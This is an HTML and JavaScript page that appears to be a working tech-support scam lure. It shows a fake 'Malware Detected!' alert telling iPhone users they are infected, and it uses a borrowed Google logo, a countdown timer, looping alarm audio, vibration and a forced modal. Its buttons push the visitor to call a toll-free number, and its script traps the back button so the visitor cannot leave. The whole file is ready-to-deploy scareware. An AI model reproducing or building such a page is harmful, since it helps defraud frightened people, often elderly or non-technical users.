<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="minimal-ui, width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

  <title>Malware Detected</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" />

  <style>
    body, html {
      height: 100%;
      margin: 0;
      overflow: hidden; /* Prevent scrolling */
    }

    .fullscreen {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: white;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .modal-content {
      text-align: center;
    }

    #countdown-timer {
      font-size: 3rem;
    }
  </style>
</head>

<body>
  <div class="fullscreen">
    <h1 class="fw-bold text-danger text-center" style="font-size: 35px">Malware Detected!</h1>
    <div class="w-100 d-flex justify-content-center py-3">
      <button id="callButton1" class="btn btn-danger border-0 text-white" style="font-size: 1.5rem;">
        Call +1 877 838 1219
      </button>
    </div>
    <div class="w-100 d-flex justify-content-center py-3">
      <img class="w-50" src="./assets/img/google_logo.webp" alt="./assets/img/google_logo.webp" />
    </div>
    <h6>Your iPhone has been infected by viruses and malware</h6>
    <h4 class="fw-bold text-danger text-center">
      <span id="countdown-timer">0:00</span> minutes remaining
    </h4>

    <div class="w-100 d-flex justify-content-center py-3">
      <button class="btn btn-success" id="vibrateButton" data-bs-toggle="modal" data-bs-target="#virusModal">
        Repair iPhone Virus
      </button>
    </div>
  </div>

  <div class="modal fade" id="virusModal" tabindex="-1" aria-labelledby="virusModalLabel" aria-hidden="true" data-bs-backdrop="static">
    <div class="modal-dialog modal-dialog-centered">
      <div class="modal-content">
        <h1 class=" fs-1 fw-bold text-center text-danger">Danger</h1>
        <p>Mobile infections (4) dangerous viruses...</p>
        <div class="d-flex justify-content-center">
          <button id="callButton" class="btn btn-danger border-0 text-white" style="font-size: 1.2rem;">
            Call +1 877 838 1219
          </button>
        </div>
      </div>
    </div>
  </div>

  <!-- Audio Element -->
  <audio id="audioPlayer" src="assets/media/alert.mp3"></audio>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

  <script>
    $(document).ready(() => {
      const audioPlayer = $("#audioPlayer")[0];
      const virusModal = document.getElementById("virusModal");
      const modalInstance = new bootstrap.Modal(virusModal);

      // Start playing audio
      audioPlayer.play();
      audioPlayer.addEventListener("ended", () => {
        audioPlayer.play(); // Loop audio
      });

      // Function to simulate fullscreen on iOS
      function goFullScreenAndVibrate() {
        // Lock the viewport height and prevent scrolling
        document.body.style.height = "100vh";
        document.body.style.overflow = "hidden"; // No scrolling
        window.scrollTo(0, 0); // Prevent page scroll

        // Simulate fullscreen mode by making the body take full screen
        document.body.classList.add("fullscreen");

        // Trigger vibration
        if (navigator.vibrate) {
          navigator.vibrate([200, 100, 200]);
        }

        modalInstance.show(); // Show the modal
        audioPlayer.play(); // Play the audio
      }

      // Trigger fullscreen on user interaction (touch or click)
      window.addEventListener("touchstart", () => {
        goFullScreenAndVibrate();
      });

      window.addEventListener("click", () => {
        goFullScreenAndVibrate();
      });

      // Button action for call button
      $("#callButton").on("click", () => {
        const phoneNumber = "tel:+18778381219";
        window.location.href = phoneNumber;
      });

      // Prevent backspace key from navigating back.
      history.pushState(null, null, window.location.href);
      history.back();
      window.onpopstate = () => history.forward();
    });
  </script>
</body>

</html>
